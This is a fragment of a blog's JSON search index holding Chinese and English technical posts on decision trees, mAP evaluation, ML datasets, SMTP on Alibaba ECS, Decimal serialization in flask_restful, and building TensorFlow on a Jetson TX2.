个（ n1 + n2 = n ）。w1 和 w2 表示这两种像素各自的比重。 w1 = n1 / n w2 = n2 / n 再假定，所有灰度值小于阈值的像素的平均值和方差分别为 μ1 和 σ1，所有灰度值大于等于阈值的像素的平均值和方差分别为 μ2 和 σ2。于是，可以得到 类内差异 = w1(σ1的平方) + w2(σ2的平方) 类间差异 = w1w2(μ1-μ2)^2 可以证明，这两个式子是等价的：得到\u0026quot;类内差异\u0026quot;的最小值，等同于得到\u0026quot;类间差异\u0026quot;的最大值。不过，从计算难度看，后者的计算要容易一些。\n", 
    "url": "http:\/\/localhost:1313\/post\/cv\/similarity\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/classification\/": {
        
        "title": "Classification",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/classification\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/decision-tree\/": {
        
        "title": "Decision Tree",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/decision-tree\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/machine-learning\/": {
        
        "title": "Machine Learning",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/machine-learning\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%86%B3%E7%AD%96%E6%A0%91\/": {
        
        "title": "决策树",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%86%B3%E7%AD%96%E6%A0%91\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/decision_tree\/": {
        
        "title": "机器学习 - 决策树",
            "tags": [ "Machine Learning",  "Decision tree",  "决策树",  "classification", ],
    "content": " 机器学习-决策树 1.什么是问题树？ 请思考以下场景\n1.1.玩过猜字游戏吗？ 1.2.如何通过几个问题区分“猫狗鸡鸭”？ 1.2.1.他们的特征是什么？ 物种 腿的数量 有没有脚蹼 喙的形状 会不会游泳 猫 4 没有 没有 不会 狗 4 没有 没有 会 鸡 2 没有 尖 不会 鸭 2 有 扁 会 数据的表示方法：\n类别：猫、狗、鸡、鸭 特征：腿的数量、有没有脚蹼、喙的形状，会不会游泳 1.2.2.以下是一种区分方法 思考1：以上是不是唯一的方法？ 思考2：哪种判定方式更好？\n思考3：如何更有效的区分？\n如果某个特征区分问题更有效？ 怎么判断问题更有效？ 2.为什么需要决策树 此刻你可能会想到：\n1. 寻找关键性问题！\n2. 什么是关键性问题？\n3. 怎么寻找关键性问题？\n2.1.理论依据是什么？ \u0026ldquo;香农\u0026quot;提出信息论，其中对信息的度量成为香农熵，简称“熵(Entropy)”\n在分类问题中，假设存在类别集合为 $ (X_1, X_2, \u0026hellip; X_n) $ ，将类别 $ X_i $ 的信息定义为:\n$ l(X_i) = -log(P(X_i))$ , 其中 $ P(X_i)$为 $X_i $的概率\n熵：信息的数学期望值： $ H= -\\sum_{i=1}^n P(X_i) log(P(X_i))$\n思考4：怎么理解熵？\n信息量越大，熵越小 信息量越小，熵越大 思考5：为什么使用对数表示信息？\n概率 vs 信息\n概率越大，信息量越小 概率越小，信息量越大 多个事件同时发生的概率是多个事件发生概率相乘，总信息量是多个事件信息量相加 练习1：给定以下数据集，写出熵的计算方法\n$$ H= -\\sum_{i=1}^n P(X_i) log(P(X_i)) $$ from math import log def create_dataset(): features = [\u0026#39;legs\u0026#39;, \u0026#39;flippers\u0026#39;, \u0026#39;beak\u0026#39;, \u0026#39;swim\u0026#39;] dataset = [ [4, 0, \u0026#39;No\u0026#39;, \u0026#39;No\u0026#39;, \u0026#39;cat\u0026#39;], [4, 0, \u0026#39;No\u0026#39;, \u0026#39;No\u0026#39;, \u0026#39;cat\u0026#39;], [4, 0, \u0026#39;No\u0026#39;, \u0026#39;No\u0026#39;, \u0026#39;cat\u0026#39;], [4, 0, \u0026#39;No\u0026#39;, \u0026#39;Yes\u0026#39;, \u0026#39;dog\u0026#39;], [4, 0, \u0026#39;No\u0026#39;, \u0026#39;Yes\u0026#39;, \u0026#39;dog\u0026#39;], [2, 0, \u0026#39;Sharp\u0026#39;, \u0026#39;No\u0026#39;, \u0026#39;chicken\u0026#39;], [2, 0, \u0026#39;Sharp\u0026#39;, \u0026#39;No\u0026#39;, \u0026#39;chicken\u0026#39;], [2, 1, \u0026#39;Flat\u0026#39;, \u0026#39;No\u0026#39;, \u0026#39;duck\u0026#39;] ] return dataset, features def calc_entropy(dataset): count = len(dataset) class_counter = {} for vector in dataset: cls = vector[-1] class_counter[cls] = class_counter.get(cls, 0) + 1 entropy = 0.0 for key in class_counter.keys(): prob = float(class_counter[key])/count entropy -= prob * log(prob) return entropy dataset, features = create_dataset() entropy = calc_entropy(dataset) print(\u0026#39;Entropy: {}\u0026#39;.format(entropy)) Entropy: 1.3208883431493221 3.怎么构建决策树 核心问题：如何通过划分数据集计算信息量的提升来找到最有效的数据特征\n练习2：重新划分数据集，将符合指定特征值的数据提取出来组合新的数据集合\ndef split_dataset(dataset, feature, value): new_dataset = [] for data in dataset: if data[feature] == value: new_data = data[:feature] new_data.extend(data[feature+1:]) new_dataset.append(new_data) return new_dataset 小实验1：以下将有脚蹼和没有脚蹼的数据集划分出来\nfeature = features.index(\u0026#39;flippers\u0026#39;) with_flipper_dataset = split_dataset(dataset, feature, 1) print(\u0026#39;Dataset with flippers:\u0026#39;) print(with_flipper_dataset) print(\u0026#39;Dataset without flippers:\u0026#39;) with_flipper_dataset = split_dataset(dataset, feature, 0) print(with_flipper_dataset) Dataset with flippers: [[2, 'Flat', 'No', 'duck']] Dataset without flippers: [[4, 'No', 'No', 'cat'], [4, 'No', 'No', 'cat'], [4, 'No', 'No', 'cat'], [4, 'No', 'Yes', 'dog'], [4, 'No', 'Yes', 'dog'], [2, 'Sharp', 'No', 'chicken'], [2, 'Sharp', 'No', 'chicken']] 思考6：怎么表示最好的特征？\n信息增益：通过观察信息熵的变化求得 def select_best_feature(dataset, features): feature_count = len(dataset[0])-1 current_entropy = calc_entropy(dataset) feature_selected = None best_entropy_gain = 0 dataset_size = len(dataset) sub_datasets = {} sub_features = [] for i in range(feature_count): feature_values = set([vector[i] for vector in dataset]) subset_entropy = 0.0 print(\u0026#39; Calculating entropy by splitting dataset with feature[{0}]\u0026#39;.format(features[i])) subsets = {} for value in feature_values: print(\u0026#39; Splitting dataset with feature[{0}]=={1}\u0026#39;.format(features[i], value)) subset = split_dataset(dataset, i, value) subsets[value] = subset prob = (len(subset)*1.0)/dataset_size subset_entropy += prob * calc_entropy(subset) print(\u0026#39; Subset:\u0026#39;, subset) print(\u0026#39; Entropy:\u0026#39;, subset_entropy) entropy_gain = current_entropy-subset_entropy print(\u0026#39; Entropy gain: {}\u0026#39;.format(entropy_gain)) if best_entropy_gain \u0026lt; entropy_gain: best_entropy_gain = entropy_gain feature_selected = i sub_datasets = subsets sub_features = features[:feature_selected] sub_features.extend(features[feature_selected+1:]) return feature_selected, sub_datasets, sub_features 小实验2：请在数据全集上运行计算出最优数据特征\nbest_feature, sub_datasets, sub_features = select_best_feature(dataset, features) print(\u0026#39;Best feature: {}, name: {}\u0026#39;.format(best_feature, features[best_feature])) for feature_value in sub_datasets.keys(): print(\u0026#39;Sub dataset with feature[{}]=={}\u0026#39;.format(features[best_feature], feature_value)) print(sub_datasets[feature_value]) print(\u0026#39;Sub features: \u0026#39;, sub_features) Calculating entropy by splitting dataset with feature[legs] Splitting dataset with feature[legs]==2 Subset: [[0, 'Sharp', 'No', 'chicken'], [0, 'Sharp', 'No', 'chicken'], [1, 'Flat', 'No', 'duck']] Entropy: 0.2386928131105548 Splitting dataset with feature[legs]==4 Subset: [[0, 'No', 'No', 'cat'], [0, 'No', 'No', 'cat'], [0, 'No', 'No', 'cat'], [0, 'No', 'Yes', 'dog'], [0, 'No', 'Yes', 'dog']] Entropy: 0.6593251049913401 Entropy gain: 0.661563238157982 Calculating entropy by splitting dataset with feature[flippers] Splitting dataset with feature[flippers]==0 Subset: [[4, 'No', 'No', 'cat'], [4, 'No', 'No', 'cat'], [4, 'No', 'No', 'cat'], [4, 'No', 'Yes', 'dog'], [4, 'No', 'Yes', 'dog'], [2, 'Sharp', 'No', 'chicken'], [2, 'Sharp', 'No', 'chicken']] Entropy: 0.9441181818928854 Splitting dataset with feature[flippers]==1 Subset: [[2, 'Flat', 'No', 'duck']] Entropy: 0.9441181818928854 Entropy gain: 0.3767701612564367 Calculating entropy by splitting dataset with feature[beak] Splitting dataset with feature[beak]==No Subset: [[4, 0, 'No', 'cat'], [4, 0, 'No', 'cat'], [4, 0, 'No', 'cat'], [4, 0, 'Yes', 'dog'], [4, 0, 'Yes', 'dog']] Entropy: 0.4206322918807853 Splitting dataset with feature[beak]==Flat Subset: [[2, 1, 'No', 'duck']] Entropy: 0.4206322918807853 Splitting dataset with feature[beak]==Sharp Subset: [[2, 0, 'No', 'chicken'], [2, 0, 'No', 'chicken']] Entropy: 0.4206322918807853 Entropy gain: 0.9002560512685368 Calculating entropy by splitting dataset with feature[swim] Splitting dataset with feature[swim]==No Subset: [[4, 0, 'No', 'cat'], [4, 0, 'No', 'cat'], [4, 0, 'No', 'cat'], [2, 0, 'Sharp', 'chicken'], [2, 0, 'Sharp', 'chicken'], [2, 1, 'Flat', 'duck']] Entropy: 0.7585531985305136 Splitting dataset with feature[swim]==Yes Subset: [[4, 0, 'No', 'dog'], [4, 0, 'No', 'dog']] Entropy: 0.7585531985305136 Entropy gain: 0.5623351446188085 Best feature: 2, name: beak Sub dataset with feature[beak]==No [[4, 0, 'No', 'cat'], [4, 0, 'No', 'cat'], [4, 0, 'No', 'cat'], [4, 0, 'Yes', 'dog'], [4, 0, 'Yes', 'dog']] Sub features: ['legs', 'flippers', 'swim'] Sub dataset with feature[beak]==Flat [[2, 1, 'No', 'duck']] Sub features: ['legs', 'flippers', 'swim'] Sub dataset with feature[beak]==Sharp [[2, 0, 'No', 'chicken'], [2, 0, 'No', 'chicken']] Sub features: ['legs', 'flippers', 'swim'] 思考7：如果改动数据集会出现什么情况？\n决策树算法 算法描述： 当前数据集是否是确定的某个类型的数据，如果是则不用再对该数据集进行分类 在当前数据集上选择最好的特征，通过使用这个特征区分的子数据集拥有最好的信息 对各子数据集重复进行上述计算 伪代码： Function CreateTree IF 数据集不用再分割 THEN return 该数据集类别 ELSE 寻找待分类数据的最好特征 划分子数据集 创建分支节点 for 每个划分的子数据集 branchPoint = CreateTree return 分支节点 大家动手实现上面的算法，输出一棵树\n4.其他思考 思考8：数据集有什么样的影响？\n思考9：数据特征有什么样的影响？\n例如：\n# \u0026#39;meow\u0026#39;:0, \u0026#39;wong\u0026#39;:1, \u0026#39;googooda\u0026#39;:2, \u0026#39;ga\u0026#39;:3 def create_dataset(): features = [\u0026#39;legs\u0026#39;, \u0026#39;flippers\u0026#39;, \u0026#39;voice\u0026#39;] dataset = [ [4, 0, 0, \u0026#39;cat\u0026#39;], [4, 0, 0, \u0026#39;cat\u0026#39;], [4, 0, 0, \u0026#39;cat\u0026#39;], [4, 0, 1, \u0026#39;dog\u0026#39;], [4, 0, 1, \u0026#39;dog\u0026#39;], [2, 0, 2, \u0026#39;chicken\u0026#39;], [2, 0, 2, \u0026#39;chicken\u0026#39;], [2, 1, 3, \u0026#39;duck\u0026#39;] ] return dataset, features 物种 腿的数量 有没有脚蹼 叫声 猫 4 没有 喵喵 狗 4 没有 旺旺 鸡 2 没有 咯咯哒 鸭 2 有 嘎嘎 一种区分方法\n思考10：有没有其他方法？ 思考11：如果使用前面的算法会得出什么样的结果呢？\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/decision_tree\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/map\/": {
        
        "title": "MAP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/map\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/map\/": {
        
        "title": "MAP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/map\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/evaluation_metric\/": {
        
        "title": "模型评估指标",
            "tags": [ "mAP", ],
    "content": " 关于mAP这篇文章写得不错：\nhttps://medium.com/@chih.sheng.huang821/深度學習系列-什麼是ap-map-aaf089920848\nmAP定义及相关概念mAP: mean Average Precision, 即各类别AP的平均值AP: PR曲线下面积，后文会详细讲解PR曲线: Precision-Recall曲线Precision: TP / (TP + FP)Recall: TP / (TP + FN)TP: IoU\u0026gt;0.5的检测框数量（同一Ground Truth只计算一次）FP: IoU\u0026lt;=0.5的检测框，或者是检测到同一个GT的多余检测框的数量FN: 没有检测到的GT的数量\nmAP计算示例假设，对于Aeroplane类别，我们网络有以下输出(BB表示BoundingBox序号，IoU\u0026gt;0.5时GT=1)：\nBB | confidence | GT ---------------------- BB1 | 0.9 | 1 ---------------------- BB2 | 0.9 | 1 ---------------------- BB1 | 0.8 | 1 ---------------------- BB3 | 0.7 | 0 ---------------------- BB4 | 0.7 | 0 ---------------------- BB5 | 0.7 | 1 ---------------------- BB6 | 0.7 | 0 ---------------------- BB7 | 0.7 | 0 ---------------------- BB8 | 0.7 | 1 ---------------------- BB9 | 0.7 | 1 ---------------------- 因此，我们有 TP=5 (BB1, BB2, BB5, BB8, BB9), FP=5 (重复检测到的BB1也算FP)。除了表里检测到的5个GT以外，我们还有2个GT没被检测到，因此: FN = 2. 这时我们就可以按照Confidence的顺序给出各处的PR值，如下：\nrank=1 precision=1.00 and recall=0.14 ---------- rank=2 precision=1.00 and recall=0.29 ---------- rank=3 precision=0.66 and recall=0.29 ---------- rank=4 precision=0.50 and recall=0.29 ---------- rank=5 precision=0.40 and recall=0.29 ---------- rank=6 precision=0.50 and recall=0.43 ---------- rank=7 precision=0.43 and recall=0.43 ---------- rank=8 precision=0.38 and recall=0.43 ---------- rank=9 precision=0.44 and recall=0.57 ---------- rank=10 precision=0.50 and recall=0.71 ---------- 作者：知乎用户 链接：https://www.zhihu.com/question/53405779/answer/419532990 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/evaluation_metric\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/resources\/": {
        
        "title": "机器学习资料收集",
            "tags": [ "Machine Learning", ],
    "content": " 框架 Tensorflow models tensorflow官方自带的例子：https://github.com/tensorflow/models 算法模型 CNN CS231n Convolutional Neural Networks for Visual Recognition LSTM Understanding LSTM Networks by colah 数据集 CV数据集 Name Link Info ImageNet http://www.image-net.org/about-stats ~1TB，1400多万幅图片，涵盖2万多个类别，超过百万的图片有明确的类别标注和图像中物体位置的标注 COCO http://cocodataset.org/#home ~40GB，Common Object in Context PASCAL VOC http://host.robots.ox.ac.uk/pascal/VOC/voc2012/index.html ~2GB PASCAL VOC挑战赛是视觉对象的分类识别和检测的一个基准测试，提供了检测算法和学习性能的标准图像注释数据集和标准的评估系统。PASCAL VOC图片集包括20个目录：人类；动物（鸟、猫、牛、狗、马、羊）；交通工具（飞机、自行车、船、公共汽车、小轿车、摩托车、火车）；室内（瓶子、椅子、餐桌、盆栽植物、沙发、电视）。PASCAL VOC挑战赛在2012年后便不再举办，但其数据集图像质量好，标注完备，非常适合用来测试算法性能。 CIFAR http://www.cs.toronto.edu/~kriz/cifar.html ~170MB CIFAR-10包含10个类别，50,000个训练图像，彩色图像大小：32x32，10,000个测试图像。CIFAR-100与CIFAR-10类似，包含100个类，每类有600张图片，其中500张用于训练，100张用于测试；这100个类分组成20个超类。图像类别均有明确标注。CIFAR对于图像分类算法测试来说是一个非常不错的中小规模数据集。 Open Image https://github.com/openimages/dataset ~1.5GB（不包括图片） ，~900万张图像URL的数据集，里面的图片通过标签注释被分为6000多类。该数据集中的标签要比ImageNet（1000类）包含更真实生活的实体存在 Youtube-8M https://research.google.com/youtube8m/ ~1.5TB，来自youtube，共计8百万个视频，总时长50万小时，4800类。 深度学习数据集收集网站 http://deeplearning.net/datasets/ Tiny Images Dataset http://horatio.cs.nyu.edu/mit/tiny/data/index.html 8000万的32x32图像，CIFAR-10和CIFAR-100便是从中挑选的。 CoPhIR http://cophir.isti.cnr.it/whatis.html 雅虎发布的超大Flickr数据集，包含1亿多张图片。 MirFlickr1M http://press.liacs.nl/mirflickr/ Flickr数据集中挑选出的100万图像集。 SBU captioned photo dataset http://dsl1.cewit.stonybrook.edu/~vicente/sbucaptions/ Flickr的一个子集，包含100万的图像集。 NUS-WIDE http://lms.comp.nus.edu.sg/research/NUS-WIDE.htm Flickr中的27万的图像集。 Large-Scale Image Annotation using Visual Synset(ICCV 2011) http://cpl.cc.gatech.edu/projects/VisualSynset/ 机器标注的一个超大规模数据集，包含2亿图像。 SUN dataset http://people.csail.mit.edu/jxiao/SUN/ 包含13万的图像的数据集。 MSRA-MM http://research.microsoft.com/en-us/projects/msrammdata/ 包含100万的图像，23000视频；微软亚洲研究院出品，质量应该有保障。 LSUN：用于场景理解和多任务辅助（房间布局估计，显着性预测等） http://lsun.cs.princeton.edu/2016/ Caltech行人检测数据库 http://www.vision.caltech.edu/Image_Datasets/CaltechPedestrians/ UMDFaces 人脸数据库 http://www.umdfaces.io/ 一共8000+个类别，总共36W张人脸图片，标注数据 李子青组的 CASIA-WebFace(50万，1万个人) 需申请 MegaFace 华盛顿大学百万人脸MegaFace数据集，60G，邮件申请 南洋理工 WLFDB （Weakly Labeled Faces Database ） 70万+,6,025 微软的MSRA-CFW 202792 张, 1583人 汤晓欧实验室的CelebA 20万+，标注，Large-scale CelebFaces Attributes (CelebA) Dataset FaceScrub 100,100张，530人 搜狗实验室数据集 包括人物、动物、建筑、机械、风景、运动等类别，总数高达2,836,535张图片 标注工具 NLP 标注工具 | 工具 | 链接 | |\u0026mdash;+\u0026mdash;| | BRAT | |\n图像标注工具 | 工具 | 链接 | 描述 | |\u0026mdash;+\u0026mdash;+\u0026mdash;| | labelImg | https://github.com/tzutalin/labelImg | | | BBox-Label-Tool || | | Yolo_mark | https://github.com/AlexeyAB/Yolo_mark | YOLO v2 标注工具|\n视频标注工具 | 工具 | 链接 | |\u0026mdash;+\u0026mdash;| | vatic | http://web.mit.edu/vondrick/vatic/ | | CDVA（compact descriptor for video analysis）||\n论文 CV Title Link Info Speed/accuracy trade-offs for modern convolutional object detectors https://arxiv.org/pdf/1611.10012.pdf NLP NLP相关资源\n书籍 Title Link Info Interpretable machine learning https://christophm.github.io/interpretable-ml-book/intro.html 学习资料 MIT 经典教程 Deep Learning 新手 Python-机器学习 四部曲资源汇总 100-Days-Of-ML-Code ", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/resources\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ecs\/": {
        
        "title": "Ecs",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ecs\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/ecs\/": {
        
        "title": "Ecs",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/ecs\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/exmail\/": {
        
        "title": "Exmail",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/exmail\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/devops\/ecs-exmail-issue\/": {
        
        "title": "阿里ECS服务器使用腾讯企业邮箱发送SMTP邮件的问题",
            "tags": [ "ecs",  "exmail", ],
    "content": "在阿里ECS上搭建的服务需要使用腾讯企业邮箱发送团队邮件，结果发现使用腾讯官方SMTP服务器配置方法无法发送成功，最后发现需要使用 587 端口才可以，这一点在官方文档里根本看不到，真是不得不吐槽啊！\n正确的SMTP配置是： smtp.exmail.qq.com:587\n另外需要注意的一点，如果需要使用外部的25端口上的SMTP服务器时需要向ECS申请开通才行，默认情况下ECS会屏蔽25端口出方向的流量。\n", 
    "url": "http:\/\/localhost:1313\/post\/devops\/ecs-exmail-issue\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/flask\/": {
        
        "title": "Flask",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/flask\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/flask\/": {
        
        "title": "Flask",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/flask\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/flask_restful\/": {
        
        "title": "Flask_restful",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/flask_restful\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/json-decimal\/": {
        
        "title": "JSON Decimal",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/json-decimal\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/web\/": {
        
        "title": "Web",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/web\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/flask\/json-decimal\/": {
        
        "title": "解决flask_restful无法对Decimal类型数据进行序列化问题",
            "tags": [ "flask",  "flask_restful",  "JSON decimal", ],
    "content": " 在使用flask进行开发的时候发现 Decimal 类型的数据无法在作为 JSON 通过相应消息体序列化返回，出现 jsonschema.exceptions.ValidationError 错误：\njsonschema.exceptions.ValidationError: \u0026#39;1000.00\u0026#39; is not of type \u0026#39;number\u0026#39; 在使用flask进行开发的时候发现 Decimal 类型的数据无法在作为 JSON 通过相应消息体序列化返回，出现 jsonschema.exceptions.ValidationError 错误：\njsonschema.exceptions.ValidationError: \u0026#39;1000.00\u0026#39; is not of type \u0026#39;number\u0026#39; 研究 flask_restful/representations/json.py 代码发现问题出现在 **json.dump()**中\n7 def output_json(data, code, headers=None): 8 \u0026#34;\u0026#34;\u0026#34;Makes a Flask response with a JSON encoded body\u0026#34;\u0026#34;\u0026#34; 9 10 settings = current_app.config.get(\u0026#39;RESTFUL_JSON\u0026#39;, {}) 11 ... 21 dumped = dumps(data, **settings) + \u0026#34;\\n\u0026#34; 通过下面实验也可以对问题得到验证。\n\u0026gt;\u0026gt;\u0026gt; import json \u0026gt;\u0026gt;\u0026gt; import decimal \u0026gt;\u0026gt;\u0026gt; json.dumps(decimal.Decimal(\u0026#39;99.99\u0026#39;)) Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/__init__.py\u0026#34;, line 231, in dumps return _default_encoder.encode(obj) File \u0026#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/encoder.py\u0026#34;, line 199, in encode chunks = self.iterencode(o, _one_shot=True) File \u0026#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/encoder.py\u0026#34;, line 257, in iterencode return _iterencode(o, 0) File \u0026#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/encoder.py\u0026#34;, line 180, in default o.__class__.__name__) TypeError: Object of type \u0026#39;Decimal\u0026#39; is not JSON serializable 查看json.dumps()的文档知道可以通过参数 \u0026lsquo;cls\u0026rsquo; 指定JSONEncoder进行序列化。\ndumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw) Serialize ``obj`` to a JSON formatted ``str``. To use a custom ``JSONEncoder`` subclass (e.g. one that overrides the ``.default()`` method to serialize additional types), specify it with the ``cls`` kwarg; otherwise ``JSONEncoder`` is used. 结合flask_restful，可以自行定义从JSONEncoder继承下来的序列化类，通过在config中的\u0026rsquo;RESTFUL_JSON\u0026rsquo;进行定义。\n3 import json 4 import decimal ... 9 class DecimalEncoder(json.JSONEncoder): 10 def default(self, obj): 11 if isinstance(obj, decimal.Decimal): 12 return float(obj) 13 return super(DecimalEncoder, self).default(obj) 14 15 class BaseConfig(object): 16 RESTFUL_JSON = {\u0026#39;cls\u0026#39;:DecimalEncoder} ", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/flask\/json-decimal\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/tensorflow\/build_v1.7_on_tx2\/": {
        
        "title": "Build Tensorflow v1.7 on NVIDIA Jetson tx2",
            "tags": [ "Machine Learning",  "Tensorflow",  "Jetson",  "TX2", ],
    "content": " How to install tensorflow v1.7 on NVIDIA Jetson TX2 Tensorflow is a popular machine learning platform and the latest version 1.7 comes out recently. I have a NVIDIA Jetson TX2 development board and I would like to use tensorflow on it, but tensorflow doesn\u0026rsquo;t come along with the Jetpack. Here is what I did to compile one from the source code.\nEnvironment Platform: NVIDIA Jetson TX2 Jetpack: v3.2 CUDA: 9.0 cuDNN: 7.0 Build process Step1: Upgrade Jetpack $ sudo apt-get upgrade\nStep2: Compile bazel I tried 2 ways to build bazel and realized it\u0026rsquo;s far more easier to build the \u0026lsquo;dist\u0026rsquo; version.\nBuild Bazel On environment not bootstraping with protoc/grpc installed, use the \u0026lsquo;dist\u0026rsquo; distribution.\nwget https://github.com/bazelbuild/bazel/releases/download/0.11.1/bazel-0.11.1-dist.zip Decompress the source and enter the source root directory, then run the commands below to build bazel:\n./compile.sh cp output/bazel /usr/local/bin/ More words about the non-dist version:\nIf you would like to try build from the non-dist version of source code, you can download it from here:\nhttps://github.com/bazelbuild/bazel/archive/0.11.1.tar.gz Building it depends on a bunch of stuffs:\nprotobuf netty-tcnative grpc-java Step3: Build tensorflow Install python 2.7 dependencies:\n$ sudo apt-get install python-numpy python-dev python-pip python-wheel Install python 3.x dependencies:\n$ sudo apt-get install python3-numpy python3-dev python3-pip python3-wheel Download source:\nwget https://github.com/tensorflow/tensorflow/archive/v1.7.0.tar.gz Pre-build configure, here are the settings need to set manually:\nDisable Amazon S3 File System support (I have issue of \u0026ldquo;undefined symbol: _ZN3Aws11Environment6GetEnvB5cxx11EPKc\u0026rdquo; while importing tensorflow) Enable \u0026lsquo;CUDA\u0026rsquo; support cuDNN library path: /usr/lib/aarch64-linux-gnu Enable \u0026lsquo;TensorRT\u0026rsquo; and set library path: /usr/lib/aarch64-linux-gnu CUDA compute capability: 6.2 $ ./configure You have bazel 0.11.1- (@non-git) installed. Please specify the location of python. [Default is /usr/bin/python]: Found possible Python library paths: /usr/local/lib/python2.7/dist-packages /usr/lib/python2.7/dist-packages Please input the desired Python library path to use. Default is [/usr/local/lib/python2.7/dist-packages] Do you wish to build TensorFlow with jemalloc as malloc support? [Y/n]: jemalloc as malloc support will be enabled for TensorFlow. Do you wish to build TensorFlow with Google Cloud Platform support? [Y/n]: Google Cloud Platform support will be enabled for TensorFlow. Do you wish to build TensorFlow with Hadoop File System support? [Y/n]: Hadoop File System support will be enabled for TensorFlow. Do you wish to build TensorFlow with Amazon S3 File System support? [Y/n]: n No Amazon S3 File System support will be enabled for TensorFlow. Do you wish to build TensorFlow with Apache Kafka Platform support? [y/N]: No Apache Kafka Platform support will be enabled for TensorFlow. Do you wish to build TensorFlow with XLA JIT support? [y/N]: No XLA JIT support will be enabled for TensorFlow. Do you wish to build TensorFlow with GDR support? [y/N]: No GDR support will be enabled for TensorFlow. Do you wish to build TensorFlow with VERBS support? [y/N]: No VERBS support will be enabled for TensorFlow. Do you wish to build TensorFlow with OpenCL SYCL support? [y/N]: No OpenCL SYCL support will be enabled for TensorFlow. Do you wish to build TensorFlow with CUDA support? [y/N]: y CUDA support will be enabled for TensorFlow. Please specify the CUDA SDK version you want to use, e.g. 7.0. [Leave empty to default to CUDA 9.0]: Please specify the location where CUDA 9.0 toolkit is installed. Refer to README.md for more details. [Default is /usr/local/cuda]: Please specify the cuDNN version you want to use. [Leave empty to default to cuDNN 7.0]: Please specify the location where cuDNN 7 library is installed. Refer to README.md for more details. [Default is /usr/local/cuda]:/usr/lib/aarch64-linux-gnu/ Do you wish to build TensorFlow with TensorRT support? [y/N]: y TensorRT support will be enabled for TensorFlow. Please specify the location where TensorRT is installed. [Default is /usr/lib/x86_64-linux-gnu]:/usr/lib/aarch64-linux-gnu/ Please specify a list of comma-separated Cuda compute capabilities you want to build with. You can find the compute capability of your device at: https://developer.nvidia.com/cuda-gpus. Please note that each additional compute capability significantly increases your build time and binary size. [Default is: 3.5,5.2]6.2 Do you want to use clang as CUDA compiler? [y/N]: nvcc will be used as CUDA compiler. Please specify which gcc should be used by nvcc as the host compiler. [Default is /usr/bin/gcc]: Do you wish to build TensorFlow with MPI support? [y/N]: No MPI support will be enabled for TensorFlow. Please specify optimization flags to use during compilation when bazel option \u0026#34;--config=opt\u0026#34; is specified [Default is -march=native]: Would you like to interactively configure ./WORKSPACE for Android builds? [y/N]: Not configuring the WORKSPACE for Android builds. Preconfigured Bazel build configs. You can use any of the below by adding \u0026#34;--config=\u0026lt;\u0026gt;\u0026#34; to your build command. See tools/bazel.rc for more details. --config=mkl # Build with MKL support. --config=monolithic # Config for mostly static monolithic build. Configuration finished Apply patch Jetpack3.2/tensorrt.patch if you want TensorRT support.\nStart the build:\n$ bazel build --config=opt --local_resources 3072,4.0,1.0 --config=cuda //tensorflow/tools/pip_package:build_pip_package After compilation, generate pip package to \u0026rsquo;target\u0026rsquo; directory:\n$ ./bazel-bin/tensorflow/tools/pip_package/build_pip_package target Easy usage I\u0026rsquo;ve build out the pip package, feel free to use it to save some time ;-)\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/tensorflow\/build_v1.7_on_tx2\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/jetson\/": {
        
        "title": "Jetson",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/jetson\/"
        },
    
    
